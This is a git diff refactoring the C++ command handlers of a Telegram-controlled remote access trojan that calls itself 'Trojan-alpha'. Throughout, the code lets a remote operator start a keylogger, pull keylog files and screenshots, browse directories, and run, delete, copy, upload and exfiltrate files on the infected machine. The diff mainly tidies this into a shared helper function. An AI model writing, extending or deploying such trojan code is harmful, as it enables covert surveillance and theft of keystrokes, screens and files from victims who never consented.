@@ -9,57 +9,17 @@
 #include "conversions.h"
 #include "screenshot.h"
 #include "modes.h"
+#include "handle_result.h"
 
 
-// Auxiliary function that analyzes and handles main funtions' results
-void handleResult(Result result, const TgBot::Bot& bot, int64_t chatId) {
-	if (result.code == COE::Success) {
-		switch (result.response_type) {
-		case ResponseType::Text:
-			bot.getApi().sendMessage(chatId, result.response);
-			break;
-		case ResponseType::Path:
-			result = sendFile(bot, result.response, chatId);
-			handleResult(result, bot, chatId);
-		}
-		return;
+void executeIfStandardMode(TgBot::Bot& bot, TgBot::Message::Ptr message, std::function<void(int64_t)> command) {
+	if (currentMode == Mode::STANDARD) {
+		int64_t chat_id = message->chat->id;
+		command(chat_id);
 	}
-
-	std::string details = result.errorDetails;
-	std::wstring wdetails = utf8_to_wstring(details);
-	details = wstringToUtf8(wdetails);
-
-	std::string message;
-	switch (result.code) {
-	case COE::EmptyInput:	   message = "Invalid input: empty or null message. "; break;
-
-	case COE::EmptyDirectory:  message = "Directory is empty. "; break;
-
-	case COE::PathNotFound:	   message = "Path does not exist. "; break;
-
-	case COE::NotADirectory:   message = "The path is not a directory. "; break;
-
-	case COE::ConversionError: message = "Error converting path to wide string. "; break;
-
-	case COE::FilesystemError: message = "Filesystem error. "; break;
-
-	case COE::UnexpectedError: message = "Unexpected error. "; break;
-
-	case COE::ExecutionError:  message = "Execution error. "; break;
-
-	case COE::UnknownError:	   message = "Unknown error occurred. "; break;
-
-	case COE::OpenFileError:   message = "Error opening a file. "; break;
-
-	case COE::LimitError:	   message = "Error: Telegram limit exceeded for message size. "; break;
-
-	case COE::NotARegularFile: message = "The path is not a regular file. "; break;
-
-	case COE::RemoveFileError: message = "Cannot delete the file. "; break;
-
-	case COE::NotAFile:		   message = "Please send a file first. "; break;
+	else {
+		bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode.");
 	}
-	bot.getApi().sendMessage(chatId, message + details);
 }
 
 
@@ -73,200 +33,149 @@ void startBot(std::string token)
 
 
 	bot.getEvents().onCommand("start", [&bot](TgBot::Message::Ptr message) {
-		if (currentMode == Mode::STANDARD)
-		{
-			bot.getApi().sendMessage(message->chat->id,
-				std::string("Hello, welcome to Trojan-alpha. Here's the commands you can use:\n")
-				+ "/start_key_logger - starts key logger;\n"
-				+ "/kill_key_logger - kills key logger;\n"
-				+ "/send_scr - makes and sends screenshot;\n"
-				+ "/send_key_logger - sends a file with key logs;\n"
-				+ "/check_dir_mode - opens check directory mode;\n"
-				+ "/full_check_dir_mode - opens full check directory mode;\n"
-				+ "/start_file_mode - opens start file mode;\n"
-				+ "/delete_file_mode - opens delete file mode;\n"
-				+ "/copy_file_mode - opens copy file mode;\n"
-				+ "/send_file_mode - opens send file mode;\n"
-				+ "/upload_file_mode - opens upload file mode;\n"
-				+ "/play_music_mode - opens play music mode;\n"
-				+ "/stop_music - stops music;\n"
-				+ "/exit_mode - exits your current mode.\n");
-			bot.getApi().sendMessage(message->chat->id, "ChatID: " + std::to_string(message->chat->id));
-		}
-		else
-			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode.");
 
+		executeIfStandardMode(bot, message, [&](int64_t chat_id) {
+			ostringstream commands;
+			commands << "Hello, welcome to Trojan-alpha. Here's the commands you can use:\n"
+				<< "/start_key_logger - starts key logger;\n"
+				<< "/kill_key_logger - kills key logger;\n"
+				<< "/send_scr - makes and sends screenshot;\n"
+				<< "/send_key_logger - sends a file with key logs;\n"
+				<< "/check_dir_mode - opens check directory mode;\n"
+				<< "/full_check_dir_mode - opens full check directory mode;\n"
+				<< "/start_file_mode - opens start file mode;\n"
+				<< "/delete_file_mode - opens delete file mode;\n"
+				<< "/copy_file_mode - opens copy file mode;\n"
+				<< "/send_file_mode - opens send file mode;\n"
+				<< "/upload_file_mode - opens upload file mode;\n"
+				<< "/play_music_mode - opens play music mode;\n"
+				<< "/stop_music - stops music;\n"
+				<< "/exit_mode - exits your current mode.\n";
+
+			bot.getApi().sendMessage(message->chat->id, commands.str());
+			bot.getApi().sendMessage(message->chat->id, string("ChatID: ") + to_string(message->chat->id));
+			});
 		});
 
 
 	bot.getEvents().onCommand("start_key_logger", [&bot](TgBot::Message::Ptr message) {
-		if (currentMode == Mode::STANDARD)
-		{
-			int64_t chat_id = message->chat->id;
-
+		executeIfStandardMode(bot, message, [&](int64_t chat_id) {
 			bot.getApi().sendMessage(chat_id, "Starting Key Logger.");
 			isKeyLoggerRunning = true;
 
-			thread keyLogger(startKeyLogger, std::ref(bot), chat_id);
+			thread keyLogger(startKeyLogger, ref(bot), chat_id);
 			keyLogger.detach();
-		}
-		else
-			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode.");
+			});
 		});
 
 
 	bot.getEvents().onCommand("kill_key_logger", [&bot](TgBot::Message::Ptr message) {
-		if (currentMode == Mode::STANDARD)
-		{
+		executeIfStandardMode(bot, message, [&](int64_t chat_id) {
 			isKeyLoggerRunning = false;
-			bot.getApi().sendMessage(message->chat->id, "Killing current key_logger session.");
-		}
-		else
-			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode");
+			bot.getApi().sendMessage(chat_id, "Killing current key_logger session.");
+			Result result = deleteFile(filename);
+			handleResult(result, bot, chat_id);
+			});
 		});
 
 
 	bot.getEvents().onCommand("send_key_logger", [&bot](TgBot::Message::Ptr message) {
-		if (currentMode == Mode::STANDARD)
-		{
-			ifstream inFile(filename);
-
-			if (!inFile) {
-				bot.getApi().sendMessage(message->chat->id, "Error: Cannot open file!");
-				return;
-			}
-
-			if (inFile.peek() == std::ifstream::traits_type::eof())
-				bot.getApi().sendMessage(message->chat->id, "The file is empty.");
-			else
-				bot.getApi().sendDocument(message->chat->id, TgBot::InputFile::fromFile(filename, "text/plain"));
-		}
-		else
-			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode.");
-
+		executeIfStandardMode(bot, message, [&](int64_t chat_id) {
+			Result result = sendFile(bot, filename, chat_id);
+			handleResult(result, bot, chat_id);
+			});
 		});
 
 
 	bot.getEvents().onCommand("send_scr", [&bot](TgBot::Message::Ptr message) {
-		if (currentMode == Mode::STANDARD)
-		{	
+		executeIfStandardMode(bot, message, [&](int64_t chat_id) {
 			try {
 				takeScreenshot(scrname);
-				Result result = sendFile(bot, wstringToUtf8(scrname), message->chat->id);
-				handleResult(result, bot, message->chat->id);
+				Result result = sendFile(bot, wstringToUtf8(scrname), chat_id);
+				handleResult(result, bot, chat_id);
 				result = deleteFile(wstringToUtf8(scrname));
-				handleResult(result, bot, message->chat->id);
+				handleResult(result, bot, chat_id);
 			}
 			catch (const std::exception& e) {
-				bot.getApi().sendMessage(message->chat->id, std::string("Error: ") + e.what());
+				bot.getApi().sendMessage(chat_id, string("Error: ") + e.what());
 			}
-		}
-		else
-			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode.");
+			});
 		});
 
 
 	bot.getEvents().onCommand("check_dir_mode", [&bot](TgBot::Message::Ptr message) {
-		if (currentMode == Mode::STANDARD)
-		{
-			bot.getApi().sendMessage(message->chat->id, "Send a path of directory you want to check.");
+		executeIfStandardMode(bot, message, [&](int64_t chat_id) {
+			bot.getApi().sendMessage(chat_id, "Send a path of directory you want to check.");
 			currentMode = Mode::CHECK_DIR;
-		}
-		else
-			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode.");
+			});
 		});
 
 
 	bot.getEvents().onCommand("full_check_dir_mode", [&bot](TgBot::Message::Ptr message) {
-		if (currentMode == Mode::STANDARD)
-		{
-			bot.getApi().sendMessage(message->chat->id, "Send a path of directory you want to check.");
+		executeIfStandardMode(bot, message, [&](int64_t chat_id) {
+			bot.getApi().sendMessage(chat_id, "Send a path of directory you want to check.");
 			currentMode = Mode::FULL_CHECK_DIR;
-		}
-		else
-			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode.");
+			});
 		});
 
 
 	bot.getEvents().onCommand("start_file_mode", [&bot](TgBot::Message::Ptr message) {
-		if (currentMode == Mode::STANDARD)
-		{
-			bot.getApi().sendMessage(message->chat->id, "Send a path of a file you want to start.");
+		executeIfStandardMode(bot, message, [&](int64_t chat_id) {
+			bot.getApi().sendMessage(chat_id, "Send a path of a file you want to start.");
 			currentMode = Mode::START_FILE;
-		}
-		else
-			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode.");
+			});
 		});
 
 
 	bot.getEvents().onCommand("delete_file_mode", [&bot](TgBot::Message::Ptr message) {
-		if (currentMode == Mode::STANDARD)
-		{
-			bot.getApi().sendMessage(message->chat->id, "Send a path of a file you want to delete.");
+		executeIfStandardMode(bot, message, [&](int64_t chat_id) {
+			bot.getApi().sendMessage(chat_id, "Send a path of a file you want to delete.");
 			currentMode = Mode::DELETE_FILE;
-		}
-		else
-			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode.");
+			});
 		});
 
 
 	bot.getEvents().onCommand("copy_file_mode", [&bot](TgBot::Message::Ptr message) {
-		if (currentMode == Mode::STANDARD)
-		{
-			bot.getApi().sendMessage(message->chat->id, "Send a path of a file you want to copy.");
+		executeIfStandardMode(bot, message, [&](int64_t chat_id) {
+			bot.getApi().sendMessage(chat_id, "Send a path of a file you want to copy.");
 			currentMode = Mode::COPY_FILE;
-		}
-		else
-			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode.");
+			});
 		});
 
 
 	bot.getEvents().onCommand("send_file_mode", [&bot](TgBot::Message::Ptr message) {
-		if (currentMode == Mode::STANDARD)
-		{
-			bot.getApi().sendMessage(message->chat->id, "Send a path of a file you want to download.");
+		executeIfStandardMode(bot, message, [&](int64_t chat_id) {
+			bot.getApi().sendMessage(chat_id, "Send a path of a file you want to download.");
 			currentMode = Mode::SEND_FILE;
-		}
-		else
-			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode.");
+			});
 		});
 
 
 	bot.getEvents().onCommand("upload_file_mode", [&bot](TgBot::Message::Ptr message) {
-		if (currentMode == Mode::STANDARD)
-		{
-			bot.getApi().sendMessage(message->chat->id, "Send a file you want to upload.");
+		executeIfStandardMode(bot, message, [&](int64_t chat_id) {
+			bot.getApi().sendMessage(chat_id, "Send a file you want to upload.");
 			currentMode = Mode::UPLOAD_FILE;
 			isWaitingForFile = true;
-		}
-		else
-			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode.");
+			});
 		});
 
 
 	bot.getEvents().onCommand("play_music_mode", [&bot](TgBot::Message::Ptr message) {
-		if (currentMode == Mode::STANDARD)
-		{
-			bot.getApi().sendMessage(message->chat->id, "Send a path to mp3 you want to play.");
+		executeIfStandardMode(bot, message, [&](int64_t chat_id) {
+			bot.getApi().sendMessage(chat_id, "Send a path to mp3 you want to play.");
 			currentMode = Mode::PLAY_MUSIC;
-		}
-		else
-			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode.");
+			});
 		});
 
 
 	/*bot.getEvents().onCommand("conversation_mode", [&bot](TgBot::Message::Ptr message) {
-
-		if (currentMode == MODE_STANDARD)
-		{
+		executeIfStandardMode(bot, message, [&](int64_t chat_id) {
 			ShowConsole();
 			isConversationRunning = true;
-			thread listenThread(listenMode, ref(bot), message->chat->id);
+			thread listenThread(listenMode, ref(bot), chat_id);
 			listenThread.detach();
-			currentMode = MODE_CONVERSATION;
-		}
-		else
-			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode.");
+			currentMode = Mode::CONVERSATION;
+			});
 		});*/
 
 
@@ -280,6 +189,10 @@ void startBot(std::string token)
 
 		// These commands are here for easement.
 		else if (message->text == "/exit_mode") {
+			if (currentMode == Mode::STANDARD) {
+				bot.getApi().sendMessage(message->chat->id, "Your current mode is already STANDARD.");
+				return;
+			}
 			bot.getApi().sendMessage(message->chat->id, "Exiting your current mode.");
 			currentMode = Mode::STANDARD;
 			isConversationRunning = false;
@@ -336,8 +249,8 @@ void startBot(std::string token)
 			handleResult(result, bot, message->chat->id);
 			break;
 		case Mode::PLAY_MUSIC:
-			playMusic(bot, message);
-			//handleResult(result, bot, message->chat->id);
+			result = playMusic(bot, message);
+			handleResult(result, bot, message->chat->id);
 			break;
 		}
 		});
@@ -351,13 +264,14 @@ void startBot(std::string token)
 
 		while (true) {
 			longPoll.start();
-			std::this_thread::sleep_for(std::chrono::milliseconds(100)); // Уменьшает загрузку ЦП
+			std::this_thread::sleep_for(std::chrono::milliseconds(100)); // Reduces CPU usage
 		}
 	}
 	catch (TgBot::TgException& e) {
 		printf("error: %s\n", e.what());
 	}
 }
+
 
 int main()
 {
